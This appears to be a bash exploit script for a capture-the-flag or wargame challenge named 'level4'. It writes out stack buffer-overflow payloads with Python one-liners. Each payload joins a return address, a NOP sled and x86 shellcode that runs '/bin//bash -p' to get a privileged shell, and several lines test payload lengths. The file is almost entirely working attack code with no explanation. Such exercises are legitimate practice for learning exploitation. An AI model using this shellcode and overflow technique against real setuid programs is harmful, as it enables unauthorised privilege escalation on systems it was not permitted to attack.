#!/bin/bash

out=$(python level4.py)
#./level4_prob "\0$out\0"

./level4 `./level4 $(python -c 'add="\x78\xd7\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + add + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)')` | wc -c

exit 0

./level4 $(python -c 'add="\x78\xd7\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + add + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)') | wc -c

python -c 'add="\x78\xd7\xff\xff";nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + add + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)' | wc -c

exit 0

./level4 $(python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)') | wc -c

python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x90"*nb_nop + shellcode + "\xff" * (255 - nb_nop - len(shellcode)) + "\xff"*759)' | wc -c

./level4 $(python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x00"*255)') | wc -c

python -c 'import sys;sys.stdout.write("\xcc"*4 + "\xaa"*4 + "\x00"*255)' | wc -c

#./level4_prob $'\0toto'

